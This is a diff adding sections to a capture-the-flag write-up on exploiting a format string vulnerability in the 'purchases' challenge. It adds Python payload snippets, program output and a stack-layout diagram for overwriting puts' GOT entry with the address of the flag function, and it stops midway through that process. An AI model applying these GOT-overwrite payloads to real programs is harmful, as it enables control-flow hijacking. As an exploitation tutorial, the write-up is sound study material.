@@ -42,7 +42,7 @@ int main() {
 ```
 #### Taking a quick look at the source code, we quickly spot the vulnerability which is the printf function being called without format specifiers (`printf(item);`). What this means is that printf interprets buffer as a format string, and parses any formatting instructions it may contain - thus leading to code executions and memory leaks. 
 #### A format string exploit could be executed when the application doesn’t properly validate the submitted input. For example, if a format string parameter, like %x, is inserted into the posted data, the string is parsed by the format function, and the conversion specified in the parameters is executed. However, the format function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack. 
-#### To have a better understanding of how we will exploit this challenge, here are quick links to `LiveOverflow`'s videos on format string exploitation:
+#### To have a better understanding of how we will exploit this challenge, here are quick links to `LiveOverflow`'s videos on format string exploitation and a Team (666)'s writeup I followed the format for mine:
 > [A simple Format String exploit example - bin 0x11](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18)
 
 > [Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin 0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=19)
@@ -50,6 +50,9 @@ int main() {
 > [Format String Exploit and overwrite the Global Offset Table - bin 0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20)
 
 > [Adapting the 32bit exploit to 64bit for format4 - bin 0x27](https://www.youtube.com/watch?v=_lO_rwaK_pY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=42)
+
+> [(666) Writeup for Purchases](https://github.com/Hong5489/AngstormCTF2019/tree/master/purchases)
+
 
 ### Brainstorming
 #### Examining the source code again, we see that there is is a flag function which prints out the flag for us. Taking a note of this, our exploit plan will be to take advantage of the format string vulnerability to overwrite puts' `GOT address` to the flag function - thus making puts execute what flag does. To test if our plan would work, we try it out in gdb. We set a breakpoint before the puts call, then change the it's GOT address to the address of flag:
@@ -126,5 +129,32 @@ exploit = 'AAAABBBB' + ' %8$p'
 ```
 You don't have any money to buy AAAABBBB 0x4242424241414141s. You're wasting your time! We don't even sell AAAABBBB 0x4242424241414141s. Leave this place and buy AAAABBBB 0x4242424241414141 somewhere else. Get out!
 ```
+#### Since we have our offset, let's modify our code and then replace the junk we input into the address we want to overwrite - puts GOT. Afterwhich we run it to see the results.
+```python
+#: Exploit code
+puts_GOT = 0x404018
+exploit = p64(puts_GOT) + ' %8$p'
+```
+```
+You don't have any money to buy @s. You're wasting your time! We don't even sell @s. Leave this place and buy @ somewhere else. Get out!
+```
+#### Hmmm. There seems to be a problem with our input, it somehow stops at two bytes when there should be more. The problem with this is that `p64(puts_GOT)` contains null bytes, that's why it gets terminated. To bypass this, we need to put it after the format specifier and remember to remove the null bytes to have a clearer picture of the buffer:
+```python
+#: Exploit code
+puts_GOT = 0x404018
+exploit = '%8$p ' + p64(puts_GOT)[:3]
+```
+```
+You don't have any money to buy 0x4040182070243825 @@s. You're wasting your time! We don't even sell 0x4040182070243825 @@s. Leave this place and buy 0x4040182070243825 @@ somewhere else. Get out!
+```
+#### We've printed out the address correct, but the buffer seems wrong. We only need the address for puts' GOT to be in it. So we pad our format specifier with spaces, pushing our target buffer at a higher offset. We need to keep in mind that the addresses will be 8 bytes each since its a 64-bit binary. This is what it looks like (from (666)'s writeup):
+```
+Before:
+[      8th argument    ][          9th argument        ]
+[%][8][$][p][40][40][40][00][00][00][00][00]...
 
+After:
+[      8th argument    ][          9th argument        ]
+[%][8][$][p][ ][ ][ ][ ][40][40][40][00][00][00][00][00]
+```
 
